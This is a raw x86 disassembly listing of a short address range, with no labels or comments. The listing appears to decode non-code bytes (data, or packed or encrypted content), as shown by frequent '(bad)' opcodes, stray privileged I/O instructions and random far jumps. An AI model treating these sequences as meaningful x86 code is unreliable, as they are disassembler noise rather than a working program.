  411287:	in     al,0xe
  411289:	xor    BYTE PTR [esi-0x25],0x9d
  41128d:	dec    ecx
  41128e:	jmp    0x9e79:0xbb5c53b3
  411295:	jne    0x41128e
  411297:	jl     0x41123c
  411299:	add    al,0x74
  41129b:	sub    al,0xfc
  41129d:	mov    ebx,0xc82b0ee8
  4112a2:	and    DWORD PTR ds:0xfa170453,ecx
  4112a8:	xchg   esp,eax
  4112a9:	pushf  
  4112aa:	inc    edi
  4112ab:	mov    eax,ds:0x763d6a38
  4112b0:	pop    eax
  4112b1:	pusha  
  4112b2:	mov    WORD PTR [edi-0x54],?
  4112b5:	js     0x411330
  4112b7:	cmp    al,0x6d
  4112b9:	sub    BYTE PTR [edx],0x1a
  4112bc:	in     eax,dx
  4112bd:	pop    ebp
  4112be:	(bad)  
  4112bf:	(bad)  
  4112c0:	cdq    
  4112c1:	adc    al,0x47
  4112c3:	test   ah,bh
  4112c5:	add    eax,0x89747146
  4112ca:	fisub  WORD PTR [esi]
  4112cc:	push   ebx
  4112cd:	xor    BYTE PTR [ebx],ah
  4112cf:	call   0x6984:0x2178ced7
  4112d6:	sti    
  4112d7:	out    dx,eax
  4112d8:	fld    QWORD PTR [edx]
  4112db:	aad    0xad
  4112dd:	nop
  4112de:	addr16 push ecx
  4112e0:	into   
  4112e1:	mov    ah,cl
  4112e3:	push   0x41
  4112e5:	(bad)  
  4112e6:	mov    ds:0xd87f17b6,al
  4112eb:	in     eax,0x20
  4112ed:	imul   esi,edi,0x72
  4112f0:	ins    DWORD PTR es:[edi],dx
  4112f1:	bound  esi,QWORD PTR [edx]
  4112f3:	xor    edi,DWORD PTR ds:0x28f87974
  4112f9:	std    
  4112fa:	sti    
  4112fb:	es mov dh,0x3b
  4112fe:	sbb    al,0x1b
  411300:	addr16 jg 0x411301
  411303:	rcr    DWORD PTR [ebp+0x2],0xb
  411307:	call   0x4b02:0xb0366153
  41130e:	inc    ebp
  41130f:	fstp   QWORD PTR [ebp+0x7da06fc9]
  411315:	sbb    ch,dh
  411317:	mov    DWORD PTR [edi-0x4f6c06ff],esi
  41131d:	mov    esi,0x1a5371b8
  411322:	dec    eax
  411323:	fwait
  411324:	push   0xa767834b
  411329:	imul   eax,DWORD PTR [ebp+0x2],0xff81055f
  411330:	adc    DWORD PTR [edi-0x3841a69a],edx
  411336:	out    0x68,al
  411338:	jmp    0x7decbe1c
  41133d:	pop    es
  41133e:	inc    ebx
  41133f:	jno    0x4112c7
  411341:	seto   BYTE PTR [ecx]
  411344:	test   eax,0xbbc52155
  411349:	or     cl,BYTE PTR cs:[ebp-0x441a0dec]
  411350:	add    BYTE PTR [ecx-0x45],al
  411353:	push   es
  411354:	dec    ebx
  411355:	sbb    eax,0xa728fa41
  41135a:	scas   al,BYTE PTR es:[edi]
  41135b:	(bad)  
  41135c:	add    edi,esi
  41135e:	ficom  DWORD PTR [esi]
  411360:	fsubrp st(7),st
  411362:	in     eax,dx
  411363:	jns    0x4113bd
  411365:	or     esp,DWORD PTR [esi-0x14]
  411368:	cmp    ecx,DWORD PTR [esi]
  41136a:	jno    0x411361
  41136c:	inc    edx
  41136d:	imul   esi,DWORD PTR [ebp+0x1b],0x4b
  411371:	sub    eax,esi
  411373:	inc    esi
  411374:	arpl   sp,dx
  411376:	sub    DWORD PTR [ecx+ecx*2],eax
  411379:	or     eax,0x96ece02a
  41137e:	retfw  0xa3dd
  411382:	loop   0x4113f6
  411384:	jmp    0x41139e
  411386:	mov    dh,0x9d
  411388:	dec    ecx
  411389:	push   0xffffffcd
  41138b:	test   DWORD PTR ds:0x59228217,0x1cb62b6
  411395:	shl    DWORD PTR [ecx-0x67],0x13
  411399:	adc    DWORD PTR [ecx],0xffffffa1
  41139c:	ds call 0x1f742d89
  4113a2:	mov    ds:0x6d7cc914,eax
  4113a7:	mov    fs,WORD PTR [edi-0x51542640]
  4113ad:	(bad)  
  4113ae:	retf   0x7ef9
  4113b1:	mov    esi,0x69724092
  4113b6:	imul   ebp,DWORD PTR [edi+edx*1+0x5a],0x78480e50
  4113be:	jns    0x411345
  4113c0:	push   edi
  4113c1:	int    0x81
  4113c3:	addr16 mov ah,0x1f
  4113c6:	mov    edx,eax
  4113c8:	xchg   edi,eax
  4113c9:	xchg   ebx,eax
  4113ca:	inc    edi
  4113cb:	xor    DWORD PTR [esi+esi*2+0x55295857],eax
  4113d2:	adc    al,0xc6
  4113d4:	stos   DWORD PTR es:[edi],eax
  4113d5:	or     bl,BYTE PTR [esi]
  4113d7:	sbb    eax,DWORD PTR [ebx*8+0x16ed9150]
  4113de:	fistp  DWORD PTR [ecx]
  4113e0:	jge    0x41139e
  4113e2:	test   eax,0xf3c7cbdd
  4113e7:	push   es
  4113e8:	push   ebx
  4113e9:	aaa    
  4113ea:	fisttp WORD PTR [edi-0x7eed6ae8]
  4113f0:	adc    BYTE PTR [ebx+0x6c1f1fe7],bl
  4113f6:	xchg   ecx,eax
  4113f7:	loopne 0x4113b5
  4113f9:	xchg   edx,eax
  4113fa:	jno    0x4113b1
  4113fc:	out    0x16,al
  4113fe:	push   0xffffff88
  411400:	push   esp
  411401:	imul   esp,edi,0x11
  411404:	fs test eax,0x192b3805
  41140a:	cli    
  41140b:	sbb    DWORD PTR [ecx+ecx*8],edx
  41140e:	jg     0x4113d6
  411410:	fxtract 
  411412:	(bad)  
  411413:	stos   BYTE PTR es:[edi],al
  411414:	push   ebx
  411415:	add    edi,DWORD PTR [esi]
  411417:	out    0x4c,al
  411419:	jge    0x4113c6
  41141b:	pop    es
  41141c:	popf   
  41141d:	imul   esi,DWORD PTR [edx],0x2e
  411420:	mov    cl,0x1b
  411422:	lock fcom st(3)
  411425:	sahf   
  411426:	mov    al,ds:0x2dd1ae76
  41142b:	xchg   BYTE PTR [ecx-0x15],cl
  41142e:	sbb    ah,dl
  411430:	cli    
  411431:	push   es
  411432:	mov    ebx,eax
  411434:	test   BYTE PTR [ecx+0x44e3c628],ch
  41143a:	retw   0x22aa
  41143e:	mov    bh,0xbf
  411440:	cmc    
  411441:	mov    edi,0x82cb1b1a
  411446:	sbb    dl,dl
  411448:	mov    al,ds:0x5322a096
  41144d:	fistp  DWORD PTR [edi+0x5f]
  411450:	lock mov esp,0x69a79a9f
  411456:	in     eax,dx
  411457:	imul   ebp,esi,0xffffff95
  41145a:	int3   
  41145b:	retf   
  41145c:	lods   eax,DWORD PTR ds:[esi]
  41145d:	loopne 0x4114c6
  41145f:	mov    esi,0x414d4a55
  411464:	loope  0x411477
  411466:	inc    edx
  411467:	loop   0x411440
  411469:	push   0xffffffd9
  41146b:	xor    eax,0x666eb301
  411470:	int3   
  411471:	adc    ah,BYTE PTR [esi-0x32]
  411474:	lds    eax,FWORD PTR [ecx]
  411476:	push   es
  411477:	xchg   esi,eax
  411478:	addr16 pop edi
  41147a:	xchg   ecx,eax
  41147b:	mov    DWORD PTR [edi+0x5f96f669],edx
  411481:	mov    ebp,0xe5985c81
  411486:	dec    ecx
  411487:	xchg   edx,eax
  411488:	iret   
  411489:	rcl    dl,1
  41148b:	pop    ecx
  41148c:	jg     0x4114f1
  41148e:	and    dl,ch
  411490:	in     al,0x6a
  411492:	sub    bh,dl
  411494:	and    DWORD PTR [ebx+ecx*4+0x665ec7b7],0x28
  41149c:	mov    bl,0x98
  41149e:	movhps QWORD PTR [edi-0x3a],xmm7
  4114a2:	retf   0xae87
  4114a5:	gs inc esi
  4114a7:	leave  
  4114a8:	or     eax,0xd7c0e56b
  4114ad:	sub    al,0x53
  4114af:	xor    dl,BYTE PTR [eax+0x60]
  4114b2:	cmp    edi,DWORD PTR [eax]
  4114b4:	dec    edi
  4114b5:	outs   dx,BYTE PTR ds:[esi]
  4114b6:	pop    ecx
  4114b7:	cmp    esi,ecx
  4114b9:	mov    esp,0x229024d
  4114be:	push   0x81314dc7
  4114c3:	test   eax,0x3dbd930a
  4114c8:	push   ebx
  4114c9:	jmp    0x1db82293
  4114ce:	push   edi
  4114cf:	mov    ecx,ebp
  4114d1:	push   0xc
  4114d3:	push   esp
  4114d4:	call   0x4cd75b3d
  4114d9:	and    eax,0x9884d766
  4114de:	idiv   DWORD PTR [esi]
  4114e0:	out    0x51,eax
  4114e2:	mov    ?,ebx
  4114e4:	push   edi
  4114e5:	in     al,dx
  4114e6:	js     0x411500
  4114e8:	clc    
  4114e9:	cmp    edi,DWORD PTR [ecx+0x1a400e65]
  4114ef:	jno    0x41150d
  4114f1:	in     eax,dx
  4114f2:	gs mov ebx,0x9ac9bbd
  4114f8:	imul   ecx,DWORD PTR [edi-0x31cee4ec],0xfffffffa
  4114ff:	adc    ebx,edx
  411501:	mov    ds:0x7c536971,al
  411506:	loop   0x411508
  411508:	push   ecx
  411509:	ja     0x4114bb
  41150b:	vpminub ymm5,ymm5,YMMWORD PTR [edi]
  41150f:	or     ebx,eax
  411511:	push   0xffffffd2
  411513:	stos   DWORD PTR es:[edi],eax
  411514:	push   eax
  411515:	icebp  
  411516:	sub    BYTE PTR [eax+0x41],0xf9
  41151a:	jne    0x411583
  41151c:	xchg   ecx,eax
  41151d:	sbb    al,0x79
  41151f:	aaa    
  411520:	inc    DWORD PTR [ebx]
  411522:	fld1   
  411524:	lods   al,BYTE PTR ds:[esi]
  411525:	imul   ebp,esp,0x2cdbf859
  41152b:	aad    0xb
  41152d:	sbb    al,0x79
  41152f:	inc    esi
  411530:	popf   
  411531:	push   DWORD PTR [edi+esi*4-0x2a]
  411535:	addr16 sub al,0x19
  411538:	in     eax,dx
  411539:	pop    edi
  41153a:	jb     0x41156c
  41153c:	lods   al,BYTE PTR ds:[esi]
  41153d:	mov    eax,0x9453340c
  411542:	pop    ebx
  411543:	and    al,0x96
  411545:	ds xchg edx,eax
  411547:	stos   BYTE PTR es:[edi],al
  411548:	icebp  
  411549:	imul   ebp,edi,0xffffff89
  41154c:	out    dx,eax
  41154d:	inc    esp
  41154e:	add    DWORD PTR [eax+0xb1617ee],ebp
  411554:	shl    DWORD PTR [eax+eax*1],cl
  411557:	std    
  411558:	rcr    bl,1
  41155a:	pop    ebp
  41155b:	sbb    BYTE PTR [ebp+0x6ac041dd],al
  411561:	lods   eax,DWORD PTR ds:[esi]
  411562:	jns    0x411562
  411564:	mov    WORD PTR es:[ebx-0x44],?
  411568:	rol    DWORD PTR [ebx-0x6d352b09],cl
  41156e:	dec    ecx
  41156f:	daa    
  411570:	push   eax
  411571:	popf   
  411572:	and    ax,0x9dfd
  411576:	mov    bh,0xec
  411578:	call   0xec96:0xf7f3be6a
  41157f:	fcmovnbe st,st(3)
  411581:	pop    edi
  411582:	fcmovnu st,st(5)
  411584:	shr    DWORD PTR [ecx],0x28
  411587:	sub    dl,BYTE PTR [ebx-0x56]
  41158a:	mov    DWORD PTR [edi],esi
  41158c:	ins    DWORD PTR es:[edi],dx
  41158d:	adc    al,0xef
  41158f:	push   0x29
  411591:	ins    BYTE PTR es:[edi],dx
  411592:	lock pop ecx
  411594:	push   ebp
  411595:	rcl    esp,cl
  411597:	xchg   ebp,eax
  411598:	jo     0x4115ab
  41159a:	cmp    dh,dh
  41159c:	push   edx
  41159d:	arpl   WORD PTR [ebx-0xc563aca],sp
  4115a3:	into   
  4115a4:	ss jbe 0x411530
  4115a7:	shr    BYTE PTR [ecx+ebp*2+0x66],0x90
  4115ac:	je     0x41154d
  4115ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115af:	fdivp  st(2),st
  4115b1:	iret   
  4115b2:	bound  di,DWORD PTR [edx]
  4115b5:	cld    
  4115b6:	int    0x65
  4115b8:	mov    ds:0xb7daf747,al
  4115bd:	jp     0x411638
  4115bf:	sar    BYTE PTR [ebp+0x44],cl
  4115c2:	or     eax,0x790724e1
  4115c7:	pop    ds
  4115c8:	mov    ah,0x3b
  4115ca:	adc    eax,0x64074276
  4115cf:	mov    edi,0xfb455eaa
  4115d4:	mov    bl,0xe9
  4115d6:	dec    ecx
  4115d7:	jae    0x411585
  4115d9:	cmp    BYTE PTR [eax-0x2f],0x35
  4115dd:	mul    DWORD PTR [esi-0xe]
  4115e0:	jmp    0x411618
  4115e2:	xchg   esi,eax
  4115e3:	cmp    eax,ecx
  4115e5:	dec    ecx
  4115e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115e7:	sbb    DWORD PTR [edi-0x34],eax
  4115ea:	mul    BYTE PTR [eax-0x7a22ad8b]
  4115f0:	mov    esp,esp
  4115f2:	mov    esp,0x63a45a19
  4115f7:	push   cs
  4115f8:	mov    eax,eax
  4115fa:	mov    ds:0xe336bad4,eax
  4115ff:	out    0xff,eax
  411601:	std    
  411602:	scas   al,BYTE PTR es:[edi]
  411603:	xchg   esp,eax
  411604:	icebp  
  411605:	cwde   
  411606:	pop    cx
  411608:	push   0xe6726487
  41160d:	sar    BYTE PTR [esp+ebp*4],1
  411610:	(bad)  
  411611:	in     al,dx
  411612:	scas   eax,DWORD PTR es:[edi]
  411613:	fs int3 
  411615:	xlat   BYTE PTR ds:[ebx]
  411616:	dec    eax
  411617:	mov    ebx,0x8aaa7503
  41161c:	dec    esp
  41161d:	and    al,0x9
  41161f:	sti    
  411620:	ins    BYTE PTR es:[edi],dx
  411621:	(bad)  
  411622:	out    0x23,al
  411624:	jp     0x411655
  411626:	dec    ebx
  411627:	rol    eax,cl
  411629:	stos   BYTE PTR es:[edi],al
  41162a:	cmp    dh,ah
  41162c:	js     0x4116a7
  41162e:	mov    bh,0x93
  411630:	mov    cl,0xd5
  411632:	sub    esi,DWORD PTR gs:[eax+0x2fd5a5bb]
  411639:	mov    esi,ecx
  41163b:	cdq    
  41163c:	jge    0x41165d
  41163e:	pop    ss
  41163f:	xchg   ebx,eax
  411640:	in     eax,0x32
  411642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411643:	or     BYTE PTR [ebp-0x52],dl
  411646:	nop
  411647:	mov    esi,0x485da851
  41164c:	iret   
  41164d:	pop    edx
  41164e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41164f:	jns    0x41162e
  411651:	and    esi,ebx
  411653:	shr    BYTE PTR [edx-0x19bc0db2],1
  411659:	mov    bl,dh
  41165b:	leave  
  41165c:	popf   
  41165d:	jb     0x4116a7
  41165f:	loope  0x4116a6
  411661:	aas    
  411662:	jnp    0x41169f
  411664:	sbb    DWORD PTR [esi+0x6ad4b645],esp
  41166a:	clc    
  41166b:	jbe    0x41168b
  41166d:	cmp    bh,BYTE PTR [ebx]
  41166f:	xchg   esp,eax
  411670:	push   cs
  411671:	jmp    0x4116d9
  411673:	jbe    0x41163a
  411675:	xchg   ebp,eax
  411676:	(bad)  [ebp+ebx*8+0x56]
  41167a:	push   0xffffffd5
  41167c:	mov    al,0x12
  41167e:	loope  0x4116c7
  411680:	jmp    0x41166c
  411682:	inc    esp
  411683:	mov    ds:0xb5797891,al
  411688:	ret    
  411689:	adc    eax,0x8aef644b
  41168e:	imul   edx,esi,0xffffffe1
  411691:	cwde   
  411692:	mov    esp,ebx
  411694:	idiv   BYTE PTR [edi+0x21]
  411697:	repz in al,dx
  411699:	push   0x34
  41169b:	arpl   WORD PTR [esi+0x42],cx
  41169e:	add    BYTE PTR [edi+ecx*1+0x39d3614a],dl
  4116a5:	sub    al,bl
  4116a7:	lea    edi,[esi+0x371d8611]
  4116ad:	data16 jns 0x411641
  4116b0:	repnz iret 
  4116b2:	mov    bl,ah
  4116b4:	xchg   ebp,eax
  4116b5:	out    dx,al
  4116b6:	jns    0x4116d0
  4116b8:	jmp    0xc58b71e5
  4116bd:	out    0x4f,al
  4116bf:	jg     0x411682
  4116c1:	pop    ebx
  4116c2:	data16 (bad) 
  4116c4:	fild   DWORD PTR [ebx]
  4116c6:	sub    al,0x3e
  4116c8:	stos   DWORD PTR es:[edi],eax
  4116c9:	xchg   ecx,ecx
  4116cb:	mov    DWORD PTR [esi],ecx
  4116cd:	imul   ebx,esp,0xffffffaf
  4116d0:	ins    DWORD PTR es:[edi],dx
  4116d1:	ret    
  4116d2:	mov    ds:0x66c2c672,al
  4116d7:	test   BYTE PTR [edx-0x6f],ah
  4116da:	add    al,0x11
  4116dc:	inc    esp
  4116dd:	retf   0x9eac
  4116e0:	cmp    ebp,DWORD PTR [edx-0x12]
  4116e3:	shr    dl,1
  4116e5:	test   DWORD PTR [edi+ecx*4-0x3d99222d],ecx
  4116ec:	or     eax,0x41c01b56
  4116f1:	imul   eax,DWORD PTR [ecx+eax*4+0x357169b3],0x7e50635c
  4116fc:	rcl    DWORD PTR [eax],cl
  4116fe:	dec    ecx
  4116ff:	mov    ebx,DWORD PTR [ebp+ecx*4-0x514347a5]
  411706:	xlat   BYTE PTR ds:[ebx]
  411707:	cs pusha 
  411709:	imul   eax,DWORD PTR [edi],0x11b1919d
  41170f:	sbb    al,0xc4
  411711:	push   ecx
  411712:	data16 mov cl,0x37
  411715:	xor    ch,al
  411717:	jmp    0x411743
  411719:	out    0xa9,eax
  41171b:	sbb    ebx,edx
  41171d:	ins    BYTE PTR es:[edi],dx
  41171e:	retf   0x940b
  411721:	push   ebp
  411722:	push   ebp
  411723:	mov    ds:0xbc135e53,eax
  411728:	jl     0x4116b5
  41172a:	adc    al,0xce
  41172c:	jae    0x411797
  41172e:	js     0x4116d2
  411730:	shr    DWORD PTR [esi],1
  411732:	loop   0x411725
  411734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411735:	(bad)  
  411736:	stc    
  411737:	sub    BYTE PTR [ebx+0x3d],dl
  41173a:	xchg   ebx,eax
  41173b:	retf   
  41173c:	enter  0x7ac7,0xb1
  411740:	fld    TBYTE PTR [edx-0x5e]
  411743:	in     eax,0xe6
  411745:	in     al,0x56
  411747:	cwde   
  411748:	dec    edi
  411749:	in     eax,0x66
  41174b:	repnz aad 0xef
  41174e:	in     eax,dx
  41174f:	idiv   DWORD PTR ds:0x50d62d5c
  411755:	jbe    0x4116fd
  411757:	pop    edi
  411758:	xor    al,0x92
  41175a:	adc    bl,ah
  41175c:	jne    0x4117ad
  41175e:	jns    0x4116e4
  411760:	pop    esp
  411761:	sub    DWORD PTR [esi+0xb],edi
  411764:	mov    ds:0xbb0f2356,eax
  411769:	imul   ebx,DWORD PTR [ebp+ecx*2-0x67],0xffffffe7
  41176e:	push   0x7a
  411770:	mov    cl,BYTE PTR ss:[edi+edx*1+0x53]
  411775:	push   cs
  411776:	sub    ch,BYTE PTR [ebx-0x4b]
  411779:	fistp  WORD PTR [edi+eiz*2-0x3c]
  41177d:	cmp    eax,DWORD PTR [esi+0x18]
  411780:	or     BYTE PTR [edi-0x51052315],ah
  411786:	aas    
  411787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411788:	push   ebx
  411789:	stc    
  41178a:	dec    edi
  41178b:	mov    bl,0xd5
  41178d:	icebp  
  41178e:	mov    edi,0xaa694c1d
  411793:	jecxz  0x4117f7
  411795:	sub    al,dl
  411797:	(bad)  
  411799:	and    al,0xb
  41179b:	enter  0x7b71,0x5b
  41179f:	pop    ebp
  4117a0:	mov    DWORD PTR [ecx-0xf],ebp
  4117a3:	cmp    al,0x3c
  4117a5:	xchg   edi,eax
  4117a6:	std    
  4117a7:	lds    ecx,FWORD PTR [edi+0x17792b69]
  4117ad:	call   0xd2834d0b
  4117b2:	arpl   WORD PTR [ecx],sp
  4117b4:	push   ss
  4117b5:	(bad)  
  4117b6:	xor    al,0x99
  4117b8:	shl    DWORD PTR [ecx+0x6af7accf],cl
  4117be:	clc    
  4117bf:	mov    cl,0x7a
  4117c1:	or     ebx,DWORD PTR [edx]
  4117c3:	or     DWORD PTR [ebx+0x63],edi
  4117c6:	push   ebp
  4117c7:	dec    esi
  4117c8:	push   ebx
  4117c9:	dec    ecx
  4117ca:	and    ah,BYTE PTR [ebx+0x19]
  4117cd:	je     0x4117c0
  4117cf:	sbb    al,0xe2
  4117d1:	out    dx,eax
  4117d2:	jo     0x411781
  4117d4:	push   esi
  4117d5:	sub    DWORD PTR [edx+0x34],esp
  4117d8:	shr    DWORD PTR [edi-0x5c831f98],cl
  4117de:	cmp    edi,DWORD PTR [esi]
  4117e0:	ja     0x4117cb
  4117e2:	aas    
  4117e3:	addr16 cmc 
  4117e5:	or     ebp,edx
  4117e7:	jno    0x4117af
  4117e9:	jb     0x4117bc
  4117eb:	dec    esi
  4117ec:	push   ds
  4117ed:	inc    ebp
  4117ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ef:	or     edx,DWORD PTR [ebx-0x39]
  4117f2:	into   
  4117f3:	mov    edi,0x63ede12d
  4117f8:	pop    esi
  4117f9:	mov    ebp,0x4b5b1b0a
  4117fe:	mov    ch,0x39
  411800:	ins    BYTE PTR es:[edi],dx
  411801:	fnstenv [edi-0x1d]
  411804:	push   ebx
  411805:	test   BYTE PTR [esi+eax*8-0xe],ah
  411809:	fnstsw WORD PTR [ebp-0x4d]
  41180c:	mov    ebp,0x8718578a
  411811:	fidiv  WORD PTR [ebx-0x2820d510]
  411817:	into   
  411818:	push   ebx
  411819:	loope  0x411803
  41181b:	sub    al,0xe0
  41181d:	retf   
  41181e:	stos   DWORD PTR es:[edi],eax
  41181f:	jle    0x4117fa
  411821:	pop    es
  411822:	arpl   WORD PTR [esi+0x592f8c8d],cx
  411828:	(bad)  
  411829:	in     al,0x7c
  41182b:	xchg   edi,eax
  41182c:	push   ebx
  41182d:	pop    ss
  41182e:	popf   
  41182f:	mov    esi,0x78837a3b
  411834:	scas   eax,DWORD PTR es:[edi]
  411835:	adc    esi,ebp
  411837:	sbb    edi,edi
  411839:	push   cs
  41183a:	clc    
  41183b:	xor    BYTE PTR [esp+ecx*1+0x41537abb],al
  411842:	and    DWORD PTR [eax+eax*4],ecx
  411845:	and    al,0x30
  411847:	pop    ss
  411848:	add    ebp,DWORD PTR [ebx-0x31]
  41184b:	fs dec ebp
  41184d:	pop    edi
  41184e:	bound  edx,QWORD PTR [ebx-0x28]
  411851:	loopne 0x4118b9
  411853:	jmp    0x8b4610e
  411858:	(bad)  
  411859:	sbb    eax,DWORD PTR [ebp+0x18]
  41185c:	and    edx,DWORD PTR [ebx+ecx*4+0x68a698bf]
  411863:	xchg   edx,eax
  411864:	push   ebx
  411865:	pop    edi
  411866:	popf   
  411867:	std    
  411868:	popa   
  411869:	dec    ecx
  41186a:	mov    ecx,0x169683c
  41186f:	outs   dx,DWORD PTR ds:[esi]
  411870:	cdq    
  411871:	xchg   edx,eax
  411872:	lock popa 
  411874:	jp     0x41189d
  411876:	mov    cx,0xd8f4
  41187a:	xor    ecx,DWORD PTR [edx+0x193bc5d7]
  411880:	push   edi
  411881:	addr16 dec edi
  411883:	bound  edi,QWORD PTR fs:[edi+0x1b55d0a5]
  41188a:	push   ecx
  41188b:	mov    dl,cl
  41188d:	retf   0x345b
  411890:	test   edi,ebp
  411892:	sahf   
  411893:	stos   DWORD PTR es:[edi],eax
  411894:	repnz pop ebx
  411896:	dec    ebp
  411897:	test   BYTE PTR [edx+0x4a36e6e9],bh
  41189d:	xchg   DWORD PTR ds:0x130f538a,ebx
  4118a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a4:	fwait
  4118a5:	ja     0x411827
  4118a7:	mov    dl,0x65
  4118a9:	imul   ecx,DWORD PTR [edx+0x30],0xb6e879c3
  4118b0:	jmp    0x504680b4
  4118b5:	rcl    bh,0xd2
  4118b8:	aam    0xc
  4118ba:	(bad)  
  4118bb:	scas   eax,DWORD PTR es:[edi]
  4118bc:	jae    0x411927
  4118be:	pop    eax
  4118bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118c0:	pop    ecx
  4118c1:	jmp    0x6b66:0xef83f923
  4118c8:	mov    BYTE PTR [edx],dh
  4118ca:	in     eax,dx
  4118cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118cc:	aas    
  4118cd:	push   esi
  4118ce:	bound  ebx,QWORD PTR [ebx]
  4118d0:	ss jns 0x411862
  4118d3:	push   es
  4118d4:	jp     0x411926
  4118d6:	mov    DWORD PTR [ecx],esp
  4118d8:	jne    0x4118f0
  4118da:	jae    0x411896
  4118dc:	push   ebx
  4118dd:	rol    BYTE PTR [ecx-0x6cc3403a],0x19
  4118e4:	enter  0x71dc,0x65
  4118e8:	call   0x5430731f
  4118ed:	cmp    BYTE PTR [esi+0x181209a8],cl
  4118f3:	ss pop es
  4118f5:	imul   ecx,DWORD PTR [edx-0xba57a63],0x1d
  4118fc:	pop    esi
  4118fd:	sbb    DWORD PTR [ecx-0x24],edi
  411900:	ret    0x6b22
  411903:	arpl   WORD PTR [esi],dx
  411905:	inc    esp
  411906:	scas   al,BYTE PTR es:[edi]
  411907:	test   al,0x2d
  411909:	popa   
  41190a:	sbb    eax,0xc6f73532
  41190f:	fsub   QWORD PTR [edx+0x53462d48]
  411915:	ret    
  411916:	xchg   esi,eax
  411917:	je     0x411902
  411919:	push   edi
  41191a:	jge    0x411905
  41191c:	aad    0x6a
  41191e:	push   ebx
  41191f:	pop    ebp
  411920:	es ret 0xe662
  411924:	jae    0x4118ff
  411926:	inc    esi
  411927:	int    0x53
  411929:	inc    ebx
  41192a:	call   0xd87f:0x72e0896a
  411931:	push   0xffffffdc
  411933:	popa   
  411934:	loop   0x411921
  411936:	add    ecx,DWORD PTR [ebp-0x45b61a98]
  41193c:	sbb    eax,0xed3346ca
  411941:	fcom   QWORD PTR [ecx-0x5910d324]
  411947:	fcom   st(5)
  411949:	(bad)  
  41194a:	mov    al,ds:0xd2695405
  41194f:	inc    edi
  411950:	xchg   ebx,eax
  411951:	cmp    eax,0x952b4bec
  411956:	gs loop 0x41197c
  411959:	sahf   
  41195a:	cmp    BYTE PTR [esi],dh
  41195c:	jno    0x411957
  41195e:	xchg   DWORD PTR [edx-0x42de46ec],esp
  411964:	cmp    BYTE PTR [eax+0x6cb29b74],al
  41196a:	(bad)  
  41196c:	cli    
  41196d:	or     eax,0x9ccf9165
  411972:	ret    0x4499
  411975:	loop   0x4119c4
  411977:	hlt    
  411978:	rcr    cl,cl
  41197a:	sbb    al,0x73
  41197c:	push   0x69
  41197e:	xchg   edi,eax
  41197f:	inc    esp
  411980:	add    dh,cl
  411982:	scas   al,BYTE PTR es:[edi]
  411983:	loop   0x411946
  411985:	jno    0x4119b0
  411987:	xor    DWORD PTR [edx+ebp*2-0x19],edx
  41198b:	inc    edx
  41198c:	(bad)  
  41198d:	in     eax,dx
  41198e:	xor    DWORD PTR ds:0x532f682e,ecx
  411994:	dec    ecx
  411995:	jmp    0xebfe:0xb8cceb61
  41199c:	pusha  
  41199d:	icebp  
  41199e:	cli    
  41199f:	(bad)  
  4119a0:	outs   dx,DWORD PTR ds:[esi]
  4119a1:	stos   DWORD PTR es:[edi],eax
  4119a2:	mov    edx,0xb2cac456
  4119a7:	in     eax,0xac
  4119a9:	cmp    eax,0x72f98966
  4119ae:	fdiv   QWORD PTR [ebp+eiz*1-0x60e664f2]
  4119b5:	outs   dx,DWORD PTR ds:[esi]
  4119b6:	push   ebp
  4119b7:	push   0xffffffbb
  4119b9:	jp     0x4119a5
  4119bb:	jae    0x411a10
  4119bd:	mov    ebx,0x6d211cc3
  4119c2:	call   0xc3a5:0xd46ad26f
  4119c9:	inc    DWORD PTR [edi+0x5b]
  4119cc:	aas    
  4119cd:	push   edi
  4119ce:	dec    si
  4119d0:	push   esp
  4119d1:	adc    cl,BYTE PTR [edx+0x262f97e0]
  4119d7:	sbb    esp,edi
  4119d9:	test   BYTE PTR [eax+0x5b],0xa3
  4119dd:	nop
  4119de:	dec    esi
  4119df:	pop    ss
  4119e0:	push   ebx
  4119e1:	add    eax,0x105f56dc
  4119e6:	add    ebx,DWORD PTR [esi+edx*4]
  4119e9:	imul   ebp,ecx,0x1ea38090
  4119ef:	adc    al,0x35
  4119f1:	icebp  
  4119f2:	clc    
  4119f3:	int3   
  4119f4:	push   ebx
  4119f5:	(bad)  
  4119f6:	mov    al,0x82
  4119f8:	dec    ebp
  4119f9:	xor    DWORD PTR [ebx],0x7
  4119fc:	imul   eax,ecx,0x5a53b2b8
  411a02:	xor    DWORD PTR [ebp+0xe],ebx
  411a05:	cli    
  411a06:	(bad)  
  411a07:	lods   al,BYTE PTR ds:[esi]
  411a08:	push   ebx
  411a09:	lock inc esi
  411a0b:	ss inc ebp
  411a0d:	pop    es
  411a0e:	or     DWORD PTR [edx+0x34],ecx
  411a11:	push   0xffffff8c
  411a13:	xchg   edi,eax
  411a14:	add    ch,BYTE PTR [esi+0x4a]
  411a17:	fdivr  QWORD PTR [ecx+0x55cf5375]
  411a1d:	std    
  411a1e:	int3   
  411a1f:	hlt    
  411a20:	(bad)  
  411a21:	jmp    0x1b18:0x5fb4c655
  411a28:	cld    
  411a29:	inc    esi
  411a2a:	sub    BYTE PTR [edi-0x18393bb3],0x53
  411a31:	pop    edx
  411a32:	cmc    
  411a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a34:	xchg   esi,eax
  411a35:	ss xchg edi,eax
  411a37:	cdq    
  411a38:	shr    BYTE PTR [edx+0x7e],1
  411a3b:	fstp   TBYTE PTR [edx+esi*4]
  411a3e:	imul   esi,DWORD PTR [eax],0xfffffff4
  411a41:	inc    ecx
  411a42:	cs jg  0x4119e7
  411a45:	imul   edi,DWORD PTR [edi],0xa3eb6577
  411a4b:	push   esi
  411a4c:	ss push 0x77
  411a4f:	push   edi
  411a50:	call   0x2fd8:0x44ac3b8c
  411a57:	pop    esi
  411a58:	xchg   edx,eax
  411a59:	add    BYTE PTR [edi-0x6e],al
  411a5c:	jae    0x411abf
  411a5e:	mov    ecx,0x886b7287
  411a63:	(bad)  
